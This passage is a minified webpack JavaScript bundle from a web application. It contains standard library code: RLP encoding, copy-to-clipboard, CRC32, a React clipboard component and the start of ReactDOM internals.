/*! For license information please see main.97fea2d7.js.LICENSE.txt */
(() => {
    var e = {
            576: (e, t) => {
                "use strict";

                function n(e) {
                    if (Array.isArray(e)) {
                        const t = [];
                        let r = 0;
                        for (let i = 0; i < e.length; i++) {
                            const o = n(e[i]);
                            t.push(o), r += o.length
                        }
                        return f(o(r, 192), ...t)
                    }
                    const t = g(e);
                    return 1 === t.length && t[0] < 128 ? t : f(o(t.length, 128), t)
                }

                function r(e, t, n) {
                    if (n > e.length) throw new Error("invalid RLP (safeSlice): end slice of Uint8Array out-of-bounds");
                    return e.slice(t, n)
                }

                function i(e) {
                    if (0 === e[0]) throw new Error("invalid RLP: extra zeros");
                    return u(l(e))
                }

                function o(e, t) {
                    if (e < 56) return Uint8Array.from([e + t]);
                    const n = p(e),
                        r = p(t + 55 + n.length / 2);
                    return Uint8Array.from(d(r + n))
                }

                function a(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                    if ("undefined" === typeof e || null === e || 0 === e.length) return Uint8Array.from([]);
                    const n = s(g(e));
                    if (t) return n;
                    if (0 !== n.remainder.length) throw new Error("invalid RLP: remainder must be zero");
                    return n.data
                }

                function s(e) {
                    let t, n, o, a, c;
                    const l = [],
                        u = e[0];
                    if (u <= 127) return {
                        data: e.slice(0, 1),
                        remainder: e.slice(1)
                    };
                    if (u <= 183) {
                        if (t = u - 127, o = 128 === u ? Uint8Array.from([]) : r(e, 1, t), 2 === t && o[0] < 128) throw new Error("invalid RLP encoding: invalid prefix, single byte < 0x80 are not prefixed");
                        return {
                            data: o,
                            remainder: e.slice(t)
                        }
                    }
                    if (u <= 191) {
                        if (n = u - 182, e.length - 1 < n) throw new Error("invalid RLP: not enough bytes for string length");
                        if (t = i(r(e, 1, n)), t <= 55) throw new Error("invalid RLP: expected string length to be greater than 55");
                        return o = r(e, n, t + n), {
                            data: o,
                            remainder: e.slice(t + n)
                        }
                    }
                    if (u <= 247) {
                        for (t = u - 191, a = r(e, 1, t); a.length;) c = s(a), l.push(c.data), a = c.remainder;
                        return {
                            data: l,
                            remainder: e.slice(t)
                        }
                    } {
                        if (n = u - 246, t = i(r(e, 1, n)), t < 56) throw new Error("invalid RLP: encoded list too short");
                        const o = n + t;
                        if (o > e.length) throw new Error("invalid RLP: total length is larger than the data");
                        for (a = r(e, n, o); a.length;) c = s(a), l.push(c.data), a = c.remainder;
                        return {
                            data: l,
                            remainder: e.slice(o)
                        }
                    }
                }
                t.Tj = void 0;
                const c = Array.from({
                    length: 256
                }, ((e, t) => t.toString(16).padStart(2, "0")));

                function l(e) {
                    let t = "";
                    for (let n = 0; n < e.length; n++) t += c[e[n]];
                    return t
                }

                function u(e) {
                    const t = Number.parseInt(e, 16);
                    if (Number.isNaN(t)) throw new Error("Invalid byte sequence");
                    return t
                }

                function d(e) {
                    if ("string" !== typeof e) throw new TypeError("hexToBytes: expected string, got " + typeof e);
                    if (e.length % 2) throw new Error("hexToBytes: received invalid unpadded hex");
                    const t = new Uint8Array(e.length / 2);
                    for (let n = 0; n < t.length; n++) {
                        const r = 2 * n;
                        t[n] = u(e.slice(r, r + 2))
                    }
                    return t
                }

                function f() {
                    for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                    if (1 === t.length) return t[0];
                    const r = t.reduce(((e, t) => e + t.length), 0),
                        i = new Uint8Array(r);
                    for (let o = 0, a = 0; o < t.length; o++) {
                        const e = t[o];
                        i.set(e, a), a += e.length
                    }
                    return i
                }

                function h(e) {
                    return (new TextEncoder).encode(e)
                }

                function p(e) {
                    if (e < 0) throw new Error("Invalid integer as argument, must be unsigned!");
                    const t = e.toString(16);
                    return t.length % 2 ? "0".concat(t) : t
                }

                function m(e) {
                    return e.length >= 2 && "0" === e[0] && "x" === e[1]
                }

                function g(e) {
                    if (e instanceof Uint8Array) return e;
                    if ("string" === typeof e) return m(e) ? d((t = "string" !== typeof(n = e) ? n : m(n) ? n.slice(2) : n).length % 2 ? "0".concat(t) : t) : h(e);
                    var t, n;
                    if ("number" === typeof e || "bigint" === typeof e) return e ? d(p(e)) : Uint8Array.from([]);
                    if (null === e || void 0 === e) return Uint8Array.from([]);
                    throw new Error("toBytes: received unsupported type " + typeof e)
                }
                t.Tj = {
                    encode: n,
                    decode: a
                }
            },
            270: (e, t, n) => {
                "use strict";
                var r = n(139),
                    i = {
                        "text/plain": "Text",
                        "text/html": "Url",
                        default: "Text"
                    };
                e.exports = function(e, t) {
                    var n, o, a, s, c, l, u = !1;
                    t || (t = {}), n = t.debug || !1;
                    try {
                        if (a = r(), s = document.createRange(), c = document.getSelection(), (l = document.createElement("span")).textContent = e, l.ariaHidden = "true", l.style.all = "unset", l.style.position = "fixed", l.style.top = 0, l.style.clip = "rect(0, 0, 0, 0)", l.style.whiteSpace = "pre", l.style.webkitUserSelect = "text", l.style.MozUserSelect = "text", l.style.msUserSelect = "text", l.style.userSelect = "text", l.addEventListener("copy", (function(r) {
                                if (r.stopPropagation(), t.format)
                                    if (r.preventDefault(), "undefined" === typeof r.clipboardData) {
                                        n && console.warn("unable to use e.clipboardData"), n && console.warn("trying IE specific stuff"), window.clipboardData.clearData();
                                        var o = i[t.format] || i.default;
                                        window.clipboardData.setData(o, e)
                                    } else r.clipboardData.clearData(), r.clipboardData.setData(t.format, e);
                                t.onCopy && (r.preventDefault(), t.onCopy(r.clipboardData))
                            })), document.body.appendChild(l), s.selectNodeContents(l), c.addRange(s), !document.execCommand("copy")) throw new Error("copy command was unsuccessful");
                        u = !0
                    } catch (d) {
                        n && console.error("unable to copy using execCommand: ", d), n && console.warn("trying IE specific stuff");
                        try {
                            window.clipboardData.setData(t.format || "text", e), t.onCopy && t.onCopy(window.clipboardData), u = !0
                        } catch (d) {
                            n && console.error("unable to copy using clipboardData: ", d), n && console.error("falling back to prompt"), o = function(e) {
                                var t = (/mac os x/i.test(navigator.userAgent) ? "\u2318" : "Ctrl") + "+C";
                                return e.replace(/#{\s*key\s*}/g, t)
                            }("message" in t ? t.message : "Copy to clipboard: #{key}, Enter"), window.prompt(o, e)
                        }
                    } finally {
                        c && ("function" == typeof c.removeRange ? c.removeRange(s) : c.removeAllRanges()), l && document.body.removeChild(l), a()
                    }
                    return u
                }
            },
            31: (e, t) => {
                var n;
                n = function(e) {
                    e.version = "1.2.2";
                    var t = function() {
                            for (var e = 0, t = new Array(256), n = 0; 256 != n; ++n) e = 1 & (e = 1 & (e = 1 & (e = 1 & (e = 1 & (e = 1 & (e = 1 & (e = 1 & (e = n) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1) ? -306674912 ^ e >>> 1 : e >>> 1, t[n] = e;
                            return "undefined" !== typeof Int32Array ? new Int32Array(t) : t
                        }(),
                        n = function(e) {
                            var t = 0,
                                n = 0,
                                r = 0,
                                i = "undefined" !== typeof Int32Array ? new Int32Array(4096) : new Array(4096);
                            for (r = 0; 256 != r; ++r) i[r] = e[r];
                            for (r = 0; 256 != r; ++r)
                                for (n = e[r], t = 256 + r; t < 4096; t += 256) n = i[t] = n >>> 8 ^ e[255 & n];
                            var o = [];
                            for (r = 1; 16 != r; ++r) o[r - 1] = "undefined" !== typeof Int32Array ? i.subarray(256 * r, 256 * r + 256) : i.slice(256 * r, 256 * r + 256);
                            return o
                        }(t),
                        r = n[0],
                        i = n[1],
                        o = n[2],
                        a = n[3],
                        s = n[4],
                        c = n[5],
                        l = n[6],
                        u = n[7],
                        d = n[8],
                        f = n[9],
                        h = n[10],
                        p = n[11],
                        m = n[12],
                        g = n[13],
                        v = n[14];
                    e.table = t, e.bstr = function(e, n) {
                        for (var r = ~n, i = 0, o = e.length; i < o;) r = r >>> 8 ^ t[255 & (r ^ e.charCodeAt(i++))];
                        return ~r
                    }, e.buf = function(e, n) {
                        for (var y = ~n, b = e.length - 15, w = 0; w < b;) y = v[e[w++] ^ 255 & y] ^ g[e[w++] ^ y >> 8 & 255] ^ m[e[w++] ^ y >> 16 & 255] ^ p[e[w++] ^ y >>> 24] ^ h[e[w++]] ^ f[e[w++]] ^ d[e[w++]] ^ u[e[w++]] ^ l[e[w++]] ^ c[e[w++]] ^ s[e[w++]] ^ a[e[w++]] ^ o[e[w++]] ^ i[e[w++]] ^ r[e[w++]] ^ t[e[w++]];
                        for (b += 15; w < b;) y = y >>> 8 ^ t[255 & (y ^ e[w++])];
                        return ~y
                    }, e.str = function(e, n) {
                        for (var r = ~n, i = 0, o = e.length, a = 0, s = 0; i < o;)(a = e.charCodeAt(i++)) < 128 ? r = r >>> 8 ^ t[255 & (r ^ a)] : a < 2048 ? r = (r = r >>> 8 ^ t[255 & (r ^ (192 | a >> 6 & 31))]) >>> 8 ^ t[255 & (r ^ (128 | 63 & a))] : a >= 55296 && a < 57344 ? (a = 64 + (1023 & a), s = 1023 & e.charCodeAt(i++), r = (r = (r = (r = r >>> 8 ^ t[255 & (r ^ (240 | a >> 8 & 7))]) >>> 8 ^ t[255 & (r ^ (128 | a >> 2 & 63))]) >>> 8 ^ t[255 & (r ^ (128 | s >> 6 & 15 | (3 & a) << 4))]) >>> 8 ^ t[255 & (r ^ (128 | 63 & s))]) : r = (r = (r = r >>> 8 ^ t[255 & (r ^ (224 | a >> 12 & 15))]) >>> 8 ^ t[255 & (r ^ (128 | a >> 6 & 63))]) >>> 8 ^ t[255 & (r ^ (128 | 63 & a))];
                        return ~r
                    }
                }, "undefined" === typeof DO_NOT_EXPORT_CRC ? n(t) : n({})
            },
            99: (e, t, n) => {
                "use strict";

                function r(e) {
                    return r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                        return typeof e
                    } : function(e) {
                        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                    }, r(e)
                }
                Object.defineProperty(t, "__esModule", {
                    value: !0
                }), t.CopyToClipboard = void 0;
                var i = s(n(43)),
                    o = s(n(270)),
                    a = ["text", "onCopy", "options", "children"];

                function s(e) {
                    return e && e.__esModule ? e : {
                        default: e
                    }
                }

                function c(e, t) {
                    var n = Object.keys(e);
                    if (Object.getOwnPropertySymbols) {
                        var r = Object.getOwnPropertySymbols(e);
                        t && (r = r.filter((function(t) {
                            return Object.getOwnPropertyDescriptor(e, t).enumerable
                        }))), n.push.apply(n, r)
                    }
                    return n
                }

                function l(e) {
                    for (var t = 1; t < arguments.length; t++) {
                        var n = null != arguments[t] ? arguments[t] : {};
                        t % 2 ? c(Object(n), !0).forEach((function(t) {
                            g(e, t, n[t])
                        })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : c(Object(n)).forEach((function(t) {
                            Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(n, t))
                        }))
                    }
                    return e
                }

                function u(e, t) {
                    if (null == e) return {};
                    var n, r, i = function(e, t) {
                        if (null == e) return {};
                        var n, r, i = {},
                            o = Object.keys(e);
                        for (r = 0; r < o.length; r++) n = o[r], t.indexOf(n) >= 0 || (i[n] = e[n]);
                        return i
                    }(e, t);
                    if (Object.getOwnPropertySymbols) {
                        var o = Object.getOwnPropertySymbols(e);
                        for (r = 0; r < o.length; r++) n = o[r], t.indexOf(n) >= 0 || Object.prototype.propertyIsEnumerable.call(e, n) && (i[n] = e[n])
                    }
                    return i
                }

                function d(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }

                function f(e, t) {
                    return f = Object.setPrototypeOf || function(e, t) {
                        return e.__proto__ = t, e
                    }, f(e, t)
                }

                function h(e) {
                    var t = function() {
                        if ("undefined" === typeof Reflect || !Reflect.construct) return !1;
                        if (Reflect.construct.sham) return !1;
                        if ("function" === typeof Proxy) return !0;
                        try {
                            return Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], (function() {}))), !0
                        } catch (e) {
                            return !1
                        }
                    }();
                    return function() {
                        var n, i = m(e);
                        if (t) {
                            var o = m(this).constructor;
                            n = Reflect.construct(i, arguments, o)
                        } else n = i.apply(this, arguments);
                        return function(e, t) {
                            if (t && ("object" === r(t) || "function" === typeof t)) return t;
                            if (void 0 !== t) throw new TypeError("Derived constructors may only return object or undefined");
                            return p(e)
                        }(this, n)
                    }
                }

                function p(e) {
                    if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
                    return e
                }

                function m(e) {
                    return m = Object.setPrototypeOf ? Object.getPrototypeOf : function(e) {
                        return e.__proto__ || Object.getPrototypeOf(e)
                    }, m(e)
                }

                function g(e, t, n) {
                    return t in e ? Object.defineProperty(e, t, {
                        value: n,
                        enumerable: !0,
                        configurable: !0,
                        writable: !0
                    }) : e[t] = n, e
                }
                var v = function(e) {
                    ! function(e, t) {
                        if ("function" !== typeof t && null !== t) throw new TypeError("Super expression must either be null or a function");
                        e.prototype = Object.create(t && t.prototype, {
                            constructor: {
                                value: e,
                                writable: !0,
                                configurable: !0
                            }
                        }), Object.defineProperty(e, "prototype", {
                            writable: !1
                        }), t && f(e, t)
                    }(c, e);
                    var t, n, r, s = h(c);

                    function c() {
                        var e;
                        ! function(e, t) {
                            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
                        }(this, c);
                        for (var t = arguments.length, n = new Array(t), r = 0; r < t; r++) n[r] = arguments[r];
                        return g(p(e = s.call.apply(s, [this].concat(n))), "onClick", (function(t) {
                            var n = e.props,
                                r = n.text,
                                a = n.onCopy,
                                s = n.children,
                                c = n.options,
                                l = i.default.Children.only(s),
                                u = (0, o.default)(r, c);
                            a && a(r, u), l && l.props && "function" === typeof l.props.onClick && l.props.onClick(t)
                        })), e
                    }
                    return t = c, (n = [{
                        key: "render",
                        value: function() {
                            var e = this.props,
                                t = (e.text, e.onCopy, e.options, e.children),
                                n = u(e, a),
                                r = i.default.Children.only(t);
                            return i.default.cloneElement(r, l(l({}, n), {}, {
                                onClick: this.onClick
                            }))
                        }
                    }]) && d(t.prototype, n), r && d(t, r), Object.defineProperty(t, "prototype", {
                        writable: !1
                    }), c
                }(i.default.PureComponent);
                t.CopyToClipboard = v, g(v, "defaultProps", {
                    onCopy: void 0,
                    options: void 0
                })
            },
            476: (e, t, n) => {
                "use strict";
                var r = n(99).CopyToClipboard;
                r.CopyToClipboard = r, e.exports = r
            },
            730: (e, t, n) => {
                "use strict";
                var r = n(43),
                    i = n(853);

                function o(e) {
                    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
                    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
                }
                var a = new Set,
                    s = {};

                function c(e, t) {
                    l(e, t), l(e + "Capture", t)
                }

                function l(e, t) {
                    for (s[e] = t, e = 0; e < t.length; e++) a.add(t[e])
                }
                var u = !("undefined" === typeof window || "undefined" === typeof window.document || "undefined" === typeof window.document.createElement),
                    d = Object.prototype.hasOwnProperty,
                    f = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
                    h = {},
                    p = {};

                function m(e, t, n, r, i, o, a) {
                    this.acceptsBooleans = 2 === t || 3 === t || 4 === t, this.attributeName = r, this.attributeNamespace = i, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = o, this.removeEmptyString = a
                }
                var g = {};
                "children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(e) {
                    g[e] = new m(e, 0, !1, e, null, !1, !1)
                })), [
                    ["acceptCharset", "accept-charset"],
                    ["className", "class"],
                    ["htmlFor", "for"],
                    ["httpEquiv", "http-equiv"]
                ].forEach((function(e) {
                    var t = e[0];
                    g[t] = new m(t, 1, !1, e[1], null, !1, !1)
                })), ["contentEditable", "draggable", "spellCheck", "value"].forEach((function(e) {
                    g[e] = new m(e, 2, !1, e.toLowerCase(), null, !1, !1)
                })), ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach((function(e) {
                    g[e] = new m(e, 2, !1, e, null, !1, !1)
                })), "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(e) {
                    g[e] = new m(e, 3, !1, e.toLowerCase(), null, !1, !1)
                })), ["checked", "multiple", "muted", "selected"].forEach((function(e) {
                    g[e] = new m(e, 3, !0, e, null, !1, !1)
                })), ["capture", "download"].forEach((function(e) {
                    g[e] = new m(e, 4, !1, e, null, !1, !1)
                })), ["cols", "rows", "size", "span"].forEach((function(e) {
                    g[e] = new m(e, 6, !1, e, null, !1, !1)
                })), ["rowSpan", "start"].forEach((function(e) {
                    g[e] = new m(e, 5, !1, e.toLowerCase(), null, !1, !1)
                }));
                var v = /[\-:]([a-z])/g;

                function y(e) {
                    return e[1].toUpperCase()
                }

                function b(e, t, n, r) {
                    var i = g.hasOwnProperty(t) ? g[t] : null;
                    (null !== i ? 0 !== i.type : r || !(2 < t.length) || "o" !== t[0] && "O" !== t[0] || "n" !== t[1] && "N" !== t[1]) && (function(e, t, n, r) {
                        if (null === t || "undefined" === typeof t || function(e, t, n, r) {
                                if (null !== n && 0 === n.type) return !1;
                                switch (typeof t) {
                                    case "function":
                                    case "symbol":
                                        return !0;
                                    case "boolean":
                                        return !r && (null !== n ? !n.acceptsBooleans : "data-" !== (e = e.toLowerCase().slice(0, 5)) && "aria-" !== e);
                                    default:
                                        return !1
                                }
                            }(e, t, n, r)) return !0;
                        if (r) return !1;
                        if (null !== n) switch (n.type) {
                            case 3:
                                return !t;
                            case 4:
                                return !1 === t;
                            case 5:
                                return isNaN(t);
                            case 6:
                                return isNaN(t) || 1 > t
                        }
                        return !1
                    }(t, n, i, r) && (n = null), r || null === i ? function(e) {
                        return !!d.call(p, e) || !d.call(h, e) && (f.test(e) ? p[e] = !0 : (h[e] = !0, !1))
                    }(t) && (null === n ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : i.mustUseProperty ? e[i.propertyName] = null === n ? 3 !== i.type && "" : n : (t = i.attributeName, r = i.attributeNamespace, null === n ? e.removeAttribute(t) : (n = 3 === (i = i.type) || 4 === i && !0 === n ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))))
                }
                "accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(e) {
                    var t = e.replace(v, y);
                    g[t] = new m(t, 1, !1, e, null, !1, !1)
                })), "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(e) {
                    var t = e.replace(v, y);
                    g[t] = new m(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1)
                })), ["xml:base", "xml:lang", "xml:space"].forEach((function(e) {
                    var t = e.replace(v, y);
                    g[t] = new m(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1)
                })), ["tabIndex", "crossOrigin"].forEach((function(e) {
                    g[e] = new m(e, 1, !1, e.toLowerCase(), null, !1, !1)
                })), g.xlinkHref = new m("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1), ["src", "href", "action", "formAction"].forEach((function(e) {
                    g[e] = new m(e, 1, !1, e.toLowerCase(), null, !0, !0)
                }));
                var w = r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
                    x = Symbol.for("react.element"),
                    A = Symbol.for("react.portal"),
                    k = Symbol.for("react.fragment"),
                    E = Symbol.for("react.strict_mode"),
                    S = Symbol.for("react.profiler"),
                    C = Symbol.for("react.provider"),
                    _ = Symbol.for("react.context"),
                    I = Symbol.for("react.forward_ref"),
                    P = Symbol.for("react.suspense"),
                    T = Symbol.for("react.suspense_list"),
                    B = Symbol.for("react.memo"),
                    N = Symbol.for("react.lazy");
                Symbol.for("react.scope"), Symbol.for("react.debug_trace_mode");
                var O = Symbol.for("react.offscreen");
                Symbol.for("react.legacy_hidden"), Symbol.for("react.cache"), Symbol.for("react.tracing_marker");
                var R = Symbol.iterator;

                function M(e) {
                    return null === e || "object" !== typeof e ? null : "function" === typeof(e = R && e[R] || e["@@iterator"]) ? e : null
                }
                var j, F = Object.assign;

                function L(e) {
                    if (void 0 === j) try {
                        throw Error()
                    } catch (n) {
                        var t = n.stack.trim().match(/\n( *(at )?)/);
                        j = t && t[1] || ""
                    }
                    return "\n" + j + e
                }
                var D = !1;

                function H(e, t) {
                    if (!e || D) return "";
                    D = !0;
                    var n = Error.prepareStackTrace;
                    Error.prepareStackTrace = void 0;
                    try {
                        if (t)
                            if (t = function() {
                                    throw Error()
                                }, Object.defineProperty(t.prototype, "props", {
                                    set: function() {
                                        throw Error()
                                    }
                                }), "object" === typeof Reflect && Reflect.construct) {
                                try {
                                    Reflect.construct(t, [])
                                } catch (l) {
                                    var r = l
                                }
                                Reflect.construct(e, [], t)
                            } else {
                                try {
                                    t.call()
                                } catch (l) {
                                    r = l
                                }
                                e.call(t.prototype)
                            }
                        else {
                            try {
                                throw Error()
                            } catch (l) {
                                r = l
                            }
                            e()
                        }
                    } catch (l) {
                        if (l && r && "string" === typeof l.stack) {
                            for (var i = l.stack.split("\n"), o = r.stack.split("\n"), a = i.length - 1, s = o.length - 1; 1 <= a && 0 <= s && i[a] !== o[s];) s--;
                            for (; 1 <= a && 0 <= s; a--, s--)
                                if (i[a] !== o[s]) {
                                    if (1 !== a || 1 !== s)
                                        do {
                                            if (a--, 0 > --s || i[a] !== o[s]) {
                                                var c = "\n" + i[a].replace(" at new ", " at ");
                                                return e.displayName && c.includes("<anonymous>") && (c = c.replace("<anonymous>", e.displayName)), c
                                            }
                                        } while (1 <= a && 0 <= s);
                                    break
                                }
                        }
                    } finally {
                        D = !1, Error.prepareStackTrace = n
                    }
                    return (e = e ? e.displayName || e.name : "") ? L(e) : ""
                }

                function U(e) {
                    switch (e.tag) {
                        case 5:
                            return L(e.type);
                        case 16:
                            return L("Lazy");
                        case 13:
                            return L("Suspense");
                        case 19:
                            return L("SuspenseList");
                        case 0:
                        case 2:
                        case 15:
                            return e = H(e.type, !1);
                        case 11:
                            return e = H(e.type.render, !1);
                        case 1:
                            return e = H(e.type, !0);
                        default:
                            return ""
                    }
                }

                function z(e) {
                    if (null == e) return null;
                    if ("function" === typeof e) return e.displayName || e.name || null;
                    if ("string" === typeof e) return e;
                    switch (e) {
                        case k:
                            return "Fragment";
                        case A:
                            return "Portal";
                        case S:
                            return "Profiler";
                        case E:
                            return "StrictMode";
                        case P:
                            return "Suspense";
                        case T:
                            return "SuspenseList"
                    }
                    if ("object" === typeof e) switch (e.$$typeof) {
                        case _:
                            return (e.displayName || "Context") + ".Consumer";
                        case C:
                            return (e._context.displayName || "Context") + ".Provider";
                        case I:
                            var t = e.render;
                            return (e = e.displayName) || (e = "" !== (e = t.displayName || t.name || "") ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
                        case B:
                            return null !== (t = e.displayName || null) ? t : z(e.type) || "Memo";
                        case N:
                            t = e._payload, e = e._init;
                            try {
                                return z(e(t))
                            } catch (n) {}
                    }
                    return null
                }

                function G(e) {
                    var t = e.type;
                    switch (e.tag) {
                        case 24:
                            return "Cache";
                        case 9:
                            return (t.displayName || "Context") + ".Consumer";
                        case 10:
                            return (t._context.displayName || "Context") + ".Provider";
                        case 18:
                            return "DehydratedFragment";
                        case 11:
                            return e = (e = t.render).displayName || e.name || "", t.displayName || ("" !== e ? "ForwardRef(" + e + ")" : "ForwardRef");
                        case 7:
                            return "Fragment";
                        case 5:
                            return t;
                        case 4:
                            return "Portal";
                        case 3:
                            return "Root";
                        case 6:
                            return "Text";
                        case 16:
                            return z(t);
                        case 8:
                            return t === E ? "StrictMode" : "Mode";
                        case 22:
                            return "Offscreen";
                        case 12:
                            return "Profiler";
                        case 21:
                            return "Scope";
                        case 13:
                            return "Suspense";
                        case 19:
                            return "SuspenseList";
                        case 25:
                            return "TracingMarker";
                        case 1:
                        case 0:
                        case 17:
                        case 2:
                        case 14:
                        case 15:
                            if ("function" === typeof t) return t.displayName || t.name || null;
                            if ("string" === typeof t) return t
                    }
                    return null
                }

                function q(e) {
                    switch (typeof e) {
                        case "boolean":
                        case "number":
                        case "string":
                        case "undefined":
                        case "object":
                            return e;
                        default:
                            return ""
                    }
                }

                function Q(e) {
                    var t = e.type;
                    return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === t || "radio" === t)
                }

                function W(e) {
                    e._valueTracker || (e._valueTracker = function(e) {
                        var t = Q(e) ? "checked" : "value",
                            n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
                            r = "" + e[t];
                        if (!e.hasOwnProperty(t) && "undefined" !== typeof n && "function" === typeof n.get && "function" === typeof n.set) {
                            var i = n.get,
                                o = n.set;
                            return Object.defineProperty(e, t, {
                                configurable: !0,
                                get: function() {
                                    return i.call(this)
                                },
                                set: function(e) {
                                    r = "" + e, o.call(this, e)
                                }
                            }), Object.defineProperty(e, t, {
                                enumerable: n.enumerable
                            }), {
                                getValue: function() {
                                    return r
                                },
                                setValue: function(e) {
                                    r = "" + e
                                },
                                stopTracking: function() {
                                    e._valueTracker = null, delete e[t]
                                }
                            }
                        }
                    }(e))
                }

                function V(e) {
                    if (!e) return !1;
                    var t = e._valueTracker;
                    if (!t) return !0;
                    var n = t.getValue(),
                        r = "";
                    return e && (r = Q(e) ? e.checked ? "true" : "false" : e.value), (e = r) !== n && (t.setValue(e), !0)
                }

                function Z(e) {
                    if ("undefined" === typeof(e = e || ("undefined" !== typeof document ? document : void 0))) return null;
                    try {
                        return e.activeElement || e.body
                    } catch (t) {
                        return e.body
                    }
                }

                function K(e, t) {
                    var n = t.checked;
                    return F({}, t, {
                        defaultChecked: void 0,
                        defaultValue: void 0,
                        value: void 0,
                        checked: null != n ? n : e._wrapperState.initialChecked
                    })
                }

                function J(e, t) {
                    var n = null == t.defaultValue ? "" : t.defaultValue,
                        r = null != t.checked ? t.checked : t.defaultChecked;
                    n = q(null != t.value ? t.value : n), e._wrapperState = {
                        initialChecked: r,
                        initialValue: n,
                        controlled: "checkbox" === t.type || "radio" === t.type ? null != t.checked : null != t.value
                    }
                }

                function Y(e, t) {
                    null != (t = t.checked) && b(e, "checked", t, !1)
                }

                function X(e, t) {
                    Y(e, t);
                    var n = q(t.value),
                        r = t.type;
                    if (null != n) "number" === r ? (0 === n && "" === e.value || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);
                    else if ("submit" === r || "reset" === r) return void e.removeAttribute("value");
                    t.hasOwnProperty("value") ? ee(e, t.type, n) : t.hasOwnProperty("defaultValue") && ee(e, t.type, q(t.defaultValue)), null == t.checked && null != t.defaultChecked && (e.defaultChecked = !!t.defaultChecked)
                }

                function $(e, t, n) {
                    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
                        var r = t.type;
                        if (!("submit" !== r && "reset" !== r || void 0 !== t.value && null !== t.value)) return;
                        t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t
                    }
                    "" !== (n = e.name) && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, "" !== n && (e.name = n)
                }

                function ee(e, t, n) {
                    "number" === t && Z(e.ownerDocument) === e || (null == n ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n))
                }
                var te = Array.isArray;

                function ne(e, t, n, r) {
                    if (e = e.options, t) {
                        t = {};
                        for (var i = 0; i < n.length; i++) t["$" + n[i]] = !0;
                        for (n = 0; n < e.length; n++) i = t.hasOwnProperty("$" + e[n].value), e[n].selected !== i && (e[n].selected = i), i && r && (e[n].defaultSelected = !0)
                    } else {
                        for (n = "" + q(n), t = null, i = 0; i < e.length; i++) {
                            if (e[i].value === n) return e[i].selected = !0, void(r && (e[i].defaultSelected = !0));
                            null !== t || e[i].disabled || (t = e[i])
                        }
                        null !== t && (t.selected = !0)
                    }
                }

                function re(e, t) {
                    if (null != t.dangerouslySetInnerHTML) throw Error(o(91));
